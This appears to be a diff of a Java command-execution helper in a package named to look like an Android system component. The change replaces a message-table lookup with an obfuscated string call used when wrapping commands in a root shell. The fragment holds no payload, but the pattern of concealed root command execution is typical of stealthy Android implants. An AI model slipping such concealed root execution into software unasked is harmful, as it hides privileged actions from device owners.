@@ -1,15 +1,12 @@
 package com.android.deviceinfo.util;
 
 import java.io.BufferedReader;
-import java.io.BufferedWriter;
 import java.io.InputStreamReader;
-import java.io.OutputStreamWriter;
-import java.util.ArrayList;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.m.M;
 
 public class Execute {
 	private static final String TAG = "Execute";
@@ -18,7 +15,7 @@ public class Execute {
 		String cmd = command;
 		
 		if (Status.haveRoot()) {
-			cmd = String.format("%s %s %s", Configuration.shellFile, Messages.getString("35_0"), command); // EXPORT
+			cmd = String.format("%s %s %s", Configuration.shellFile, M.e("qzx"), command); // EXPORT
 		}
 		
 		return execute(cmd);
@@ -38,7 +35,7 @@ public class Execute {
 		try {
 			localProcess = Runtime.getRuntime().exec(cmd);
 		} catch (Exception e) {
-			if (Cfg.EXP) {
+			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
 		}
